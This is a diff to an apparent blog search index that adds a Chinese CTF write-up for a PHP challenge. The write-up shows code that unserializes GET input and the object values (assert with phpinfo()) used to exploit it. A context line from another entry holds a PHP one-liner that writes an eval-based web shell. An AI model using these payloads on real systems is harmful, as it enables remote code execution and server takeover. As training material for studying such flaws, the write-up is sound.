@@ -462,4 +462,19 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p><img src="/2022/11/25/ooop/g.jpg" alt="题图"></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>ReadlezPHP</title>
+    <url>/2022/11/25/fg/</url>
+    <content><![CDATA[<p>1.<img src="/2022/11/25/fg/ghj.jpg" alt="进程图"></p>
+<p>观察得到get传参获取源码</p>
+<p>2.源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>
+
+<p>观察到echo $b($a);</p>
+<p>使用</p>
+<p> $this-&gt;a &#x3D; “phpinfo()”;<br> $this-&gt;b &#x3D; “assert”;</p>
+<p>3.<img src="/2022/11/25/fg/chicken.jpg" alt="进程图"></p>
+<p>获得flag</p>
+]]></content>
+  </entry>
 </search>
